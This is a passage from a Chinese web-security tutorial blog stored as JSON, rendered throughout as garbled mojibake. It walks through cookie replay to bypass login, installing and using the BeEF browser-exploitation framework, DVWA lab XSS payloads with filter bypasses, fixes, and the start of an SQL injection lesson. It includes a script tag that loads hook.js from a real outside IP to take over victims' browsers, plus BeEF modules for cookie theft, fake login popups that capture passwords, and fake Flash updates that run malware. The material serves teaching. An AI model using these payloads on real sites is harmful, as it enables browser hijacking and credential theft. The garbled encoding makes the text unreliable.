æ‰login.phpå†å›è½¦\n\n3ã€æœ€åå°±å¯ä»¥å‘ç°æœªç”¨ç™»é™†è´¦å·å¯†ç å°±è¿›å…¥äº†é¡µé¢\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼šå½“å¯¹æ–¹è¿›è¡Œæ­£å¸¸logoutåï¼Œå†æ¬¡ä½¿ç”¨è¯¥cookieæ˜¯ä¸èƒ½æˆåŠŸçš„ã€‚åŒæ—¶åœ¨è¿›è¡Œæ›¿æ¢åé¡»åœ¨URLä¸­è¿›è¡Œç¨è®¸ä¿®æ”¹ï¼Œå› ä¸ºæ‰€å±çš„cookieä¸åŒäºä¸€ä¸ªé¡µé¢ã€‚\n\n## å››ã€BeEF\n\n> å…¨ç§°æ˜¯ The Browser Exploitation Framework.  webæ¡†æ¶æ”»å‡»å¹³å°ï¼Œä¸“æ³¨äºåˆ©ç”¨æµè§ˆå™¨æ¼æ´.BeEFæ˜¯æˆ‘è§è¿‡çš„æœ€å¥½çš„xssåˆ©ç”¨æ¡†æ¶ï¼Œä»–åŒæ—¶èƒ½å¤Ÿé…åˆmetasploitè¿›ä¸€æ­¥æ¸—é€ä¸»æœºï¼Œå¼ºå¤§çš„æœ‰äº›å“äººï¼ï¼!\n\n### å®‰è£…\n\n#### dockerå®‰è£…\n\ndockerå®‰è£…å¾—å…ˆé…ç½®dockerç¯å¢ƒ\n\n```bash\ndocker search beef\ndocker pull janes/beef #æ‹‰å–beefé•œåƒ\ndocker images\ndocker run --rm -p 3000:3000 janes/beef #æ˜ å°„åˆ°æœ¬æœºçš„3000ç«¯å£\n```\n\n#### Ubuntu\n\n```bash\n#å®‰è£…ä¾èµ–\nsudo apt-get update\nsudo apt-get install curl git\ncurl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash -s stable\nsource ~/.rvm/scripts/rvm\nrvm install ruby-2.3.0\nrvm use 2.3.0 --default\ngem install bundle\n#å®‰è£…beef\ngit clone git://github.com/beefproject/beef.git\ncd beef\nbundle install\nruby beef\n```\n\n#### Kaliå®‰è£…\n\nè€ç‰ˆæœ¬çš„Kaliè‡ªå¸¦beef,ä½†æ˜¯æ–°ç‰ˆçš„æ²¡æœ‰\n\n```bash\napt-get update\napt-get install beef-xss\n#ç¬¬ä¸€æ¬¡å¯åŠ¨ä¼šè®©ä½ è®¾ä¸ªå¯†ç (jwt)ï¼Œè´¦å·ä¸ºbeef  #å¯ä»¥åœ¨/usr/share/beef-xss/config.yamlä¸­ä¿®æ”¹\n```\n\n### åŸºç¡€ä½¿ç”¨\n\nå®‰è£…å¥½ä¹‹ååœ¨æµè§ˆå™¨è®¿é—®:`ip:3000/ui/panel` é»˜è®¤ç”¨æˆ·åå’Œå¯†ç éƒ½ä¸º`beef`\n\n![](https://i.loli.net/2020/05/04/CHwf3xEuWYKyhms.png)\n\n![](https://i.loli.net/2020/05/04/sWqRwDvHuOS2TzU.png)\n\né»˜è®¤hook jsï¼šhttp://ip:3000/hook.js\n\né»˜è®¤hooké¡µé¢ï¼š http://ip:3000/demos/basic.html ã€€ã€€//è®¿é—®å³å¯è¢«hook\n\nå¾€å­˜åœ¨XSSæ¼æ´çš„åœ°æ–¹æ’å…¥ä»¥ä¸‹ä»£ç \n\n```\n<script src='ip:3000/hook.js'></script>;\n```\n\n**ä¸¾ä¸ªä¾‹å­**ğŸŒ°ï¼šå¾€DVWAé¶åœºæ’å…¥xssä»£ç \n\n```javascript\n<script src='http://139.224.112.182:3000/hook.js'></script>;\n```\n\n![](https://i.loli.net/2020/05/04/IDpXHhNgZJVj4Mu.png)\n\né‚£ä¹ˆåœ¨beefä¸Šå¯ä»¥çœ‹åˆ°è¢«åµŒå…¥hook.jsçš„æµè§ˆå™¨å·²ç»ä¸Šçº¿äº†\n\n![](https://i.loli.net/2020/05/04/tFSVqrnH6mp2GQN.png)\n\nç„¶åä½ å¯ä»¥é€‰æ‹©å„ç§æ”»å‡»æ¨¡å—è¿›è¡Œæ“ä½œäº†\n\n![](https://i.loli.net/2020/05/04/M3doFeh2rwPHmQW.png)\n\n\n\næ¯ä¸ªæ¨¡å—å‰é¢çš„é¢œè‰²ä»£è¡¨ç€ä¸åŒçš„æ„ä¹‰\n\n![](https://i.loli.net/2020/05/04/XCh2YvfkxbJrOGR.png)\n\n### å®ç”¨æ”»å‡»æ¨¡å—\n\nä½¿ç”¨ä¸‹é¢æ¨¡å—çš„å‰ææ˜¯ä½ ä½¿ç”¨`<script src='http://139.224.112.182:3000/hook.js'></script>;`æ§åˆ¶äº†æµè§ˆå™¨ã€‚\n\n#### è¢«æ§æµè§ˆå™¨å¼¹æ¡†\n\n> **æ¨¡å—ï¼šBrowser--->Hooked Domain--->Create Alert Dialog**\n\n![](https://i.loli.net/2020/05/04/rDFmLV2HU3XlnWY.png)\n\n![](https://i.loli.net/2020/05/04/Tb6ZRycfjphB1XG.png)\n\n#### è·å–cookie\n\n> **æ¨¡å—ï¼šBrowser--->Hooked Domain--->Get Cookie**\n\n![](https://i.loli.net/2020/05/04/h2pQ8nXkMHLKlDR.png)\n\n#### é‡å®šå‘\n\n> **æ¨¡å—ï¼šBrowser--->Hooked Domain--->Redirect Browser**\n\nå°†å½“å‰é¡µé¢é‡å®šå‘è‡³æŒ‡å®šé¡µé¢ï¼Œæœ‰å¯èƒ½å¯¼è‡´å½“å‰æƒé™ä¸¢å¤±\n\nRediret Browser(iframe)æ¨¡å—ï¼šå°†å½“å‰é¡µé¢é‡å®šå‘è‡³æŒ‡å®šé¡µé¢ï¼ŒåŒæ—¶ä¿ç•™å½“å‰è¿æ¥ï¼Œå¯ä»¥ç»´æŒå½“å‰æµè§ˆå™¨æƒé™\n\næ–¹æ³•ï¼šå³ä¾§å¡«å†™æœ¨é©¬çš„è·¯å¾„ï¼Œå¯ä»¥é…åˆæ’ä»¶å‡çº§æ”»å‡»\n\n![](https://i.loli.net/2020/05/04/YMiFKypA2QGOHX5.png)\n\n![](https://i.loli.net/2020/05/04/kjQKT1pZLO9No4z.png)\n\n#### ç¤¾å·¥å¼¹çª—\n\n> **æ¨¡å—ï¼šSocial Engineering ---> Pretty Theft**\n\nå¼¹å‡ºä¸€ä¸ªç™»å½•æ¡†ï¼Œç”¨æˆ·è¾“å…¥å¯†ç ç‚¹å‡»ç™»å½•ä¹‹åï¼Œbeefå¯ä»¥è·å–åˆ°å¯†ç \n\n![](https://i.loli.net/2020/05/04/yOdzaUkAL3TiGZ8.png)\n\n![](https://i.loli.net/2020/05/04/WOGD9JBZKQ8fuaI.png)\n\n![](https://i.loli.net/2020/05/04/pLzr2fen1ivJqGI.png)\n\n#### ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»\n\n> **æ¨¡å—ï¼šSocial Engineering ---> Fake Flash Update**\n\nåœ¨ç¤¾å·¥è¿™ä¸€æ ï¼Œå¯ä»¥é€‰æ‹©flashæ›´æ–°è¿™ç±»åŠŸèƒ½æ¥è¯±ä½¿ç”¨æˆ·å‡çº§Flashï¼Œå½“ç”¨æˆ·ç‚¹å‡»ä¹‹åï¼Œä¼šä¸‹è½½æˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶æ‰§è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨c2(command&control)æ§åˆ¶ç”¨æˆ·çš„ç³»ç»Ÿ.\n\n![](https://i.loli.net/2020/05/04/SnuIYFDLHN2AcB9.png)\n\n\n![](https://i.loli.net/2020/05/04/wZA7CjqGIWU5YNi.png)\n####  æŒä¹…åŒ–\n\n> **æ¨¡å—ï¼šPersistence--->Create Foreground iFrame**\n\nä½¿ç”¨ä¹‹åï¼Œè¢«æ§æµè§ˆå™¨æ— è®ºç‚¹å‡»å“ªé‡Œï¼Œéƒ½æ— æ³•è·³è½¬åˆ°è¯¥ç³»ç»Ÿåˆ°å…¶ä»–é¡µé¢\n\n![](https://i.loli.net/2020/05/04/qEusjtYSDMWgali.png)\n\n\n\n#### å†…ç½‘æ‰«æ\n\n> **æ¨¡å—ï¼šNetwork--->Port Scanner**\n\nNetworkç”¨äºæ”¶é›†å†…ç½‘ä¿¡æ¯ï¼Œæ¯”å¦‚pingã€ç«¯å£æ‰«æ\n\n#### æ³¨å…¥éšè—çš„iframeæ¡†æ¶\n\n> **Misc --> Create Invisible Frame**\n\n### å…¶ä»–æ¨¡å—\n\n#### Simple Hijackeræ¨¡å—\n\nåŠ«æŒç½‘é¡µä¸Šé¢çš„æ‰€æœ‰é“¾æ¥ï¼Œå½“ç”¨æˆ·ç‚¹å‡»ä»»æ„é“¾æ¥æ—¶å¼¹å‡ºè¯±éª—æ¶ˆæ¯ï¼Œå¦‚æœç”¨æˆ·æ¥ç€ç‚¹å‡»ä¼šè·³è½¬åˆ°æŒ‡å®šåŸŸå\n\n#### Clippyæ¨¡å—\n\nåˆ›å»ºä¸€ä¸ªæµè§ˆå™¨åŠ©æ‰‹æç¤ºç”¨æˆ·ç‚¹å‡»\n\n#### TabNabbingæ¨¡å—\n\nå½“æ£€æµ‹ç”¨æˆ·ä¸åœ¨å½“å‰é¡µé¢æ—¶å¯åŠ¨å®šæ—¶å™¨ï¼Œå€’è®¡æ—¶ç»“æŸåè‡ªåŠ¨é‡å®šå‘è‡³æŒ‡å®šé¡µé¢\n\n#### Clickjackingæ¨¡å—\n\nå¯ä»¥ä½¿ç”¨multi-click clickjackingï¼Œåˆ¤æ–­å½“å‰ç”¨æˆ·é¼ æ ‡ä½ç½®ï¼Œåœ¨ä¸åŒä½ç½®å¯è§¦å‘ä¸åŒJSä»£ç å¦‚å›¾ï¼Œé¼ æ ‡åé¢è·Ÿéšä¸€ä¸ªiframe\n\n#### Create Pop Underæ¨¡å—\n\nåˆ›å»ºä¸€ä¸ªæ–°çª—å£\n\n#### Confirm Close Tabæ¨¡å—\n\nå½“ç”¨æˆ·å…³é—­å½“å‰é¡µé¢æ—¶ï¼Œåå¤å¼¹å‡ºç¡®è®¤æ˜¯å¦å…³é—­é¡µé¢çš„æ¶ˆæ¯\n\n### hookæ‰‹æœº\n\nç”±äºæ‰‹æœºæ‰“å¼€ç½‘å€æŒç»­çš„æ—¶é—´å¾ˆçŸ­ï¼Œå…³é—­å½“å‰é¡µé¢åBeEFçš„shellå°±ä¼šä¸‹çº¿ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨BeEF APIï¼Œç”¨æˆ·ä¸Šçº¿åèƒ½å¤Ÿè‡ªåŠ¨æ‰§è¡Œæ‰¹é‡å‘½ä»¤ï¼Œç»“åˆPersistenceæ¨¡å—èƒ½å¤Ÿæå¤§æé«˜shellå­˜æ´»æ—¶é—´ã€‚é™¤äº†ä¸windowsç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯æ— æ³•è·å–ï¼Œå…¶ä»–æ“ä½œå‡èƒ½æˆåŠŸæ‰§è¡Œï¼Œå¹¶ä¸”BeEFä¸ºæ‰‹æœºåŠ«æŒæä¾›äº†ä¸“é—¨çš„æ¨¡å—ç³»åˆ—â€”â€”**Phonegap**\n\n```\n1ã€å¼¹æ¡†\n2ã€é‡å®šå‘ \n3ã€æŸ¥çœ‹æ˜¯å¦è®¿é—®è¿‡æŸäº›ç½‘ç«™\n4ã€Creates an invisible iframe\n5ã€Social Engineeringç³»åˆ—ï¼Œå¦‚ä¸‹å›¾ï¼Œä»…ä½œæ¼”ç¤º \n6ã€msfç³»åˆ—\n7ã€NetWorkç³»åˆ—ï¼Œå¯ä»¥ç”¨æ¥æ‰«æåŒä¸€å†…ç½‘ä¸‹çš„windowsä¸»æœº\n```\n\nå‚è€ƒï¼š\n\n[Beefå®‰è£…ä¸ç®€å•ä½¿ç”¨](https://www.cnblogs.com/ssooking/p/6036494.html)\n\n## äº”ã€ä¿®å¤å»ºè®®\n\n- å°†ç”¨æˆ·æ‰€æä¾›çš„å†…å®¹è¾“å…¥è¾“å‡ºè¿›è¡Œè¿‡æ»¤ã€‚å¯ä»¥è¿ç”¨ä¸‹é¢è¿™äº›å‡½æ•°å¯¹å‡ºç°XSSæ¼æ´çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼š\n- PHPçš„htmlentities()æˆ–æ˜¯htmlspecialchars()\n- Pythonçš„cgi.escape()\n- ASPçš„Server.HTMLEncode()\n- ASP.NETçš„Server.HtmlEncode()æˆ–åŠŸèƒ½æ›´å¼ºçš„Microsoft Anti-Cross Site Scripting Library\n- Javaçš„xssprotect(Open Source Library)\n- Node.jsçš„node-validator\n\n## å…­ã€XSSé¶åœº\n\n### DVWA\n\n#### Xss(reflected)-Low\n\nç‚¹å‡»å³ä¸‹è§’çš„view sourceï¼ŒæŸ¥çœ‹æºç \n\n![](https://i.loli.net/2020/05/12/RikyZUWGxE1g3cw.png)\n\n**åˆ†æï¼š**\n```arrary_key_exists()å‡½æ•°ï¼šåˆ¤æ–­$_GETçš„å€¼ä¸­æ˜¯å¦å­˜åœ¨â€œnameâ€é”®åã€‚å¹¶ä¸”$_GET[â€˜nameâ€™]çš„å€¼æ˜¯å¦ä¸ä¸ºç©ºï¼Œæ»¡è¶³è¿™äº›æ¡ä»¶ï¼Œç›´æ¥è¾“å‡ºä¸‹é¢çš„è¾“å‡ºè¯­å¥ã€‚å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº†nameå‚æ•°ï¼Œå¹¶æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„XSSæ¼æ´ã€‚```\n\n**`payloadï¼š<script>alert('ç®€ç®€')</script>`**\n\n\n\n#### Xss(reflected)-Medium\n\næºç ï¼š\n\n![](https://i.loli.net/2020/05/12/frRTuiw9bovlFax.png)\n\n**åˆ†æï¼š**\nè¿™é‡Œå¯¹è¾“å…¥è¿›è¡Œäº†è¿‡æ»¤ï¼ŒåŸºäºé»‘åå•çš„æ€æƒ³ï¼Œä½¿ç”¨str_replaceå‡½æ•°å°†è¾“å…¥ä¸­çš„`<script>`è½¬åŒ–ä¸ºç©ºã€‚ç„¶ååœ¨å°†nameå€¼çš„ç»“æœè¾“å‡ºï¼Œè¿™ç§é˜²æŠ¤æœºåˆ¶æ˜¯å¯ä»¥è¢«è½»æ¾ç»•è¿‡çš„ã€‚\n\n**1**.å¤§å°å†™æ··æ·†ç»•è¿‡ï¼ˆstr_replace()å‡½æ•°ä¸å¤ªå®Œç¾ï¼Œå› ä¸ºå®ƒåŒºåˆ†å¤§å°å†™ï¼‰\n\n**`Payloadï¼š<ScRipt>alert('ç®€ç®€')</script>`**\n\n**`Payloadï¼š<SCRIPT>alert('ç®€ç®€')</SCRIPT>`**\n\n**2**.åŒå†™ç»•è¿‡\n\n**`Payloadï¼š<sc<script>ript>alert('ç®€ç®€')</script>`**\n\n**3**.æ„é€ ä¸ä½¿ç”¨`<script>`æ ‡ç­¾è¿›è¡Œç»•è¿‡\n\n**`payloadï¼š<img src=1 onerror=alert('ç®€ç®€')>`**\n\nè§£é‡Šï¼š<img ..>æ ‡ç­¾æ˜¯æ·»åŠ ä¸€ä¸ªå›¾ç‰‡ï¼Œsrcæ˜¯æŒ‡å®šå›¾ç‰‡çš„urlï¼Œonerroræ˜¯æŒ‡å®šåŠ è½½å›¾ç‰‡æ—¶å¦‚æœå‡ºç°é”™è¯¯åˆ™è¦æ‰§è¡Œçš„äº‹ä»¶,è¿™é‡Œæˆ‘ä»¬çš„å›¾ç‰‡urlè‚¯å®šæ˜¯é”™è¯¯çš„ï¼Œè¿™ä¸ªå¼¹æ¡†äº‹ä»¶ä¹Ÿå¿…å®šä¼šæ‰§è¡Œ\n\n#### Xss(reflected)-High\n\næºç ï¼š\n\n![](https://i.loli.net/2020/05/12/51q3sPZvMljNBbx.png)\n\n**åˆ†æï¼š**\nHighçº§åˆ«çš„ä»£ç åŒæ ·ä½¿ç”¨é»‘åå•è¿‡æ»¤è¾“å…¥ï¼Œpreg_replace() å‡½æ•°å°†åŒ…å«<scriptçš„å­—ç¬¦ï¼Œä¸ç®¡å¤§å°å†™ï¼Œä¸ç®¡åé¢è·Ÿç€1ä¸ªæˆ–å¤šä¸ªä¸ä¹‹ç›¸åŒçš„å­—ç¬¦éƒ½è½¬æ¢ä¸ºç©ºã€‚ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œè¿™ä½¿å¾—åŒå†™ç»•è¿‡ã€å¤§å°å†™æ··æ·†ç»•è¿‡ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ä¸­iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼‰ä¸å†æœ‰æ•ˆã€‚\n**`Payloadï¼š<img src=1 onerror=alert('ç®€ç®€')>`**\n\n#### XSS(Stored)-Low\n\n![](https://i.loli.net/2020/04/03/DcoxeTjLSVKM8yp.png)\n\nç›¸å…³å‡½æ•°ä»‹ç»ï¼š\n```php\ntrim(string,charlist) å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œé¢„å®šä¹‰å­—ç¬¦åŒ…æ‹¬\\0ã€\\tã€\\nã€\\x0Bã€\\rä»¥åŠç©ºæ ¼ï¼Œå¯é€‰å‚æ•°charlistæ”¯æŒæ·»åŠ é¢å¤–éœ€è¦åˆ é™¤çš„å­—ç¬¦ã€‚\n\nmysqli_real_escape_string(string,connection) å‡½æ•°ä¼šå¯¹å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šç¬¦å·ï¼ˆ\\x00ï¼Œ\\nï¼Œ\\rï¼Œ\\ï¼Œ'ï¼Œ\"ï¼Œ\\x1aï¼‰è¿›è¡Œè½¬ä¹‰ã€‚\n\nstripslashes(string) å‡½æ•°åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ ã€‚\n```\n**åˆ†æ**ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¾“å…¥å¹¶æ²¡æœ‰åšXSSæ–¹é¢çš„è¿‡æ»¤ä¸æ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨æ˜æ˜¾çš„å­˜å‚¨å‹XSSæ¼æ´ã€‚\n\n**Exploit**\nmessageæ çš„åˆ©ç”¨ï¼š\nè¾“å…¥`<script>alert(/name/)</script>`ï¼ŒæˆåŠŸå¼¹æ¡†ï¼š\n\n<img src=\"https://i.loli.net/2020/04/03/kl6X5ZIAvjBWzT1.png\"/>\n\n**nameæ çš„åˆ©ç”¨ï¼š**\nå‘ç°å‰ç«¯htmlä¸­å¯¹nameæœ‰å­—æ•°é•¿åº¦é™åˆ¶:\nBurpsuite æŠ“åŒ…æ”¹ä¸º`<script>alert(/name/)</script>`\n\n![image-20200403140251503.png](https://i.loli.net/2020/04/03/qtpc7elTUKoD894.png)\n\nç‚¹å‡»Bpä¸­Forward åï¼ŒæˆåŠŸå¼¹çª—ï¼š\n\n![image-20200403140311971](https://i.loli.net/2020/04/03/wa4g3N1nstOobRM.png)\n\n#### XSS(Stored)-Medium\n\n![image-20200403140334188](https://i.loli.net/2020/04/03/7tPfxlAo6anS2Bq.png)\n\n```php\nstrip_tags()å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„HTMLã€XMLä»¥åŠPHPçš„æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨<b>æ ‡ç­¾ã€‚\n\naddslashes()å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ï¼ˆå•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULLï¼‰ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚\n```\n**åˆ†æ**ï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œç”±äºå¯¹messageå‚æ•°ä½¿ç”¨äº†htmlspecialcharså‡½æ•°è¿›è¡Œç¼–ç ï¼Œå› æ­¤æ— æ³•å†é€šè¿‡messageå‚æ•°æ³¨å…¥XSSä»£ç ï¼Œä½†æ˜¯å¯¹äºnameå‚æ•°ï¼Œåªæ˜¯ç®€å•è¿‡æ»¤äº†`<script>`å­—ç¬¦ä¸²ï¼Œä»ç„¶å­˜åœ¨å­˜å‚¨å‹çš„XSSã€‚\n\n**Exploit**\n**1**.åŒå†™ç»•è¿‡\nBurpsuiteæŠ“åŒ…æ”¹nameå‚æ•°ä¸º:`<sc<script>ript>alert(/name/)</script>`\n\n![image-20200403140440550.png](https://i.loli.net/2020/04/03/brcmMd2n3wCIBFo.png)\n\n**2**.å¤§å°å†™æ··æ·†ç»•è¿‡\n\nBurpsuiteæŠ“åŒ…æ”¹nameå‚æ•°ä¸º:`<ScRipt>alert(/name/);</ScRipt>`\n\n<img src=\"https://i.loli.net/2020/04/03/7tVsywGdQLOuKDY.png\" alt=\"image-20200403140456913\"  />\n\n**3.**ä½¿ç”¨é script æ ‡ç­¾çš„ xss payloadï¼š\n\neg:imgæ ‡ç­¾ï¼š\n\nBurpsuiteæŠ“åŒ…æ”¹nameå‚æ•°ä¸º:`<img src=1 onerror=alert(/name/)>`\n\n![image-20200403140509371.png](https://i.loli.net/2020/04/03/P48rwRItdYovXSB.png)\n\nå…¶ä»–æ ‡ç­¾å’Œåˆ©ç”¨è¿˜æœ‰å¾ˆå¤šå¾ˆå¤šâ€¦.\nä»¥ä¸ŠæŠ“åŒ…ä¿®æ”¹æ•°æ®Forwardåï¼Œå‡æˆåŠŸå¼¹çª—ï¼š\n![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)\n\n#### XSS(Stored)-High\n\n![image-20200403140538783.png](https://i.loli.net/2020/04/03/rhBgMw4HaE8UQCn.png)\n\n**åˆ†æ**ï¼š\nè¿™é‡Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†`<script>`æ ‡ç­¾ï¼Œä½†æ˜¯å´å¿½ç•¥äº†imgã€iframeç­‰å…¶å®ƒå±é™©çš„æ ‡ç­¾ï¼Œå› æ­¤nameå‚æ•°ä¾æ—§å­˜åœ¨å­˜å‚¨å‹XSSã€‚\n\n**Exploit**\nBurpsuiteæŠ“åŒ…æ”¹nameå‚æ•°ä¸º`<img src=1 onerror=alert(/name/)>`\n![image-20200403140643833.png](https://i.loli.net/2020/04/03/qIta128pKgxW4NR.png)\nForwardåï¼ŒæˆåŠŸå¼¹çª—ï¼š\n![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["XSS"],"categories":["Web"]},{"title":"SQLæ³¨å…¥ä»å…¥é—¨åˆ°è¿›é˜¶","url":"/posts/32179.html","content":"<center><font color=pink size=8 weigh:500>SQLæ³¨å…¥ä»å…¥é—¨åˆ°è¿›é˜¶</font></center>\n\næœ¬æ–‡ç« äº§ç”Ÿçš„ç¼˜ç”±æ˜¯å› ä¸ºä¸“ä¸šè€å¸ˆï¼Œè®©æˆ‘ç»™æœ¬ä¸“ä¸šçš„åŒå­¦è®²ä¸€å“ˆSQLæ³¨å…¥å’ŒXSSå…¥é—¨ï¼Œä¹Ÿå°±æ˜¯æœ¬æ–‡çš„å…¥é—¨ç¯‡ï¼Œè®²å®Œä¸¤èŠ‚è¯¾åï¼Œå‘ç°è‡ªå·±å¯¹äºSQLæ³¨å…¥çš„ç†è§£ä¹Ÿå°±ä»…ä»…å±€é™äºå…¥é—¨ï¼Œäºæ˜¯æœ‰äº†è¿›é˜¶ç« èŠ‚çš„äº§ç”Ÿã€‚\n\n# å…¥é—¨ç¯‡\n\n## ä¸€ã€è¯¾ç¨‹ç›®æ ‡\n\n> å¬å®Œè¿™èŠ‚è¯¾ä½ èƒ½å­¦åˆ°äº›ä»€ä¹ˆğŸ‘‡\n\n\n- [x] çŸ¥é“ä»€ä¹ˆæ˜¯Sqlæ³¨å…¥\n- [x] å®ç°æœ€åŸºç¡€çš„Sqlæ³¨å…¥\n- [x] å­¦ä¼šä½¿ç”¨SqlMapå·¥å…·\n- [x] äº†è§£ä¸€äº›Webå®‰å…¨åŸºæœ¬çŸ¥è¯†\n\n## äºŒã€åˆè¯†SQLæ³¨å…¥\n\n### 1 ä»€ä¹ˆæ˜¯SQL\n\n> SQLï¼ˆStructured Query Languageï¼‰ æ˜¯ç”¨äº`è®¿é—®å’Œå¤„ç†æ•°æ®åº“`çš„æ ‡å‡†çš„è®¡ç®—æœºè¯­è¨€,SQLä¸æ•°æ®åº“ç¨‹åºååŒå·¥ä½œï¼Œæ¯”å¦‚ SQL Serverã€MySQLã€Oracleã€SQLiteã€MongoDBã€PostgreSQLã€MS Accessã€DB2ä»¥åŠå…¶ä»–æ•°æ®åº“ç³»ç»Ÿã€‚\n\n![2020å¹´5æœˆ](https://i.loli.net/2020/05/02/OxEr91piQSkj7Mc.png)\n\n**SQLæ‰§è¡Œæµç¨‹**\n\n![](https://i.loli.net/2020/05/02/k1MB6fsTlyzXH9J.jpg)\n\n###  2 ä»€ä¹ˆæ˜¯SQLæ³¨å…¥\n\n> SQLæ³¨å…¥æ˜¯æŒ‡webåº”ç”¨ç¨‹åºå¯¹**ç”¨æˆ·è¾“å…¥æ•°æ®çš„åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­æˆ–è¿‡æ»¤ä¸ä¸¥**ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨webåº”ç”¨ç¨‹åºä¸­äº‹å…ˆå®šä¹‰å¥½çš„æŸ¥è¯¢è¯­å¥çš„ç»“å°¾ä¸Š**æ·»åŠ é¢å¤–çš„SQLè¯­å¥**ï¼Œä»¥æ­¤æ¥å®ç°æ¬ºéª—æ•°æ®åº“æœåŠ¡å™¨**æ‰§è¡Œéæˆæƒçš„ä»»æ„æŸ¥è¯¢**ï¼Œä»è€Œå¾—åˆ°ç›¸åº”çš„æ•°æ®ä¿¡æ¯ã€‚\n\n**é€šä¿—æ¥è¯´ï¼š**OWASP Top10ä¹‹ä¸€ï¼ŒSQLæ³¨å…¥æ˜¯é€šè¿‡å°†`æ¶æ„çš„SQLè¯­å¥`æ’å…¥åˆ°Webåº”ç”¨çš„è¾“å…¥å‚æ•°ä¸­ï¼Œ`æ¬ºéª—æœåŠ¡å™¨`æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤çš„æ”»å‡»ã€‚\n\n**SQLæ³¨å…¥æµç¨‹**\n\n![](https://i.loli.net/2020/05/02/Ligwo95FqyQaHcV.png) \n\n### 3 SQLæ³¨å…¥åˆ†ç±»\n\n**æ ¹æ®SQLæ•°æ®ç±»å‹åˆ†ç±»**\n\n- æ•´å‹æ³¨å…¥\n- å­—ç¬¦å‹æ³¨å…¥\n\n**æ ¹æ®æ³¨å…¥çš„è¯­æ³•åˆ†ç±»**\n\n- è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion query SQL injectionï¼‰\n- æŠ¥é”™å‹æ³¨å…¥ï¼ˆError-based SQL injectionï¼‰\n- å¸ƒå°”å‹æ³¨å…¥ï¼ˆBoolean-based blind SQL injectionï¼‰\n- å»¶æ—¶æ³¨å…¥ï¼ˆTime-based blind SQL injectionï¼‰\n- å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ ï¼ˆStacted queries SQL injectionï¼‰\n\n##  ä¸‰ã€åˆè¯•SQLæ³¨å…¥\n\n### 1 æ‰‹å·¥æ³¨å…¥å¸¸è§„æ€è·¯\n\n**1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹** \n2.çŒœè§£ SQL æŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°\n3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº \n4.è·å–å½“å‰æ•°æ®åº“ \n5.è·å–æ•°æ®åº“ä¸­çš„è¡¨ \n6.è·å–è¡¨ä¸­çš„å­—æ®µå \n7.æ˜¾ç¤ºå­—æ®µä¿¡æ¯\n\n\n\n![æ‰‹å·¥æ³¨å…¥æµç¨‹](https://img.jwt1399.top//img/20200608143317.png)\n\n### 2 å®ç°å®Œæ•´æ‰‹å·¥æ³¨å…¥\n\n**é¶æœºï¼šDVWA**\n\nå°†DVWAçš„çº§åˆ«è®¾ç½®ä¸ºlowï¼Œå¯ä»¥çœ‹åˆ°æºç ä¸­æ˜¯ä¸€å¥ç®€å•çš„æŸ¥è¯¢è¯­å¥ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡è¿‡æ»¤\n\n```sql\n$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\n```\nå› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥æ’å…¥è‡ªå·±æƒ³è¦æ‰§è¡Œçš„sqlè¯­å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¼€å§‹å§ï¼\n\nè¾“å…¥æˆ‘ä»¬è¾“å…¥1ï¼Œé‚£ä¹ˆæ‰§è¡Œçš„è¯­å¥å°±æ˜¯\n\n`SELECT first_name, last_name FROM users WHERE user_id = '1'`\n\n#### 1.åˆ¤æ–­æ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹\n\n> å­—ç¬¦å‹å’Œæ•°å­—å‹æœ€å¤§åŒºåˆ«: 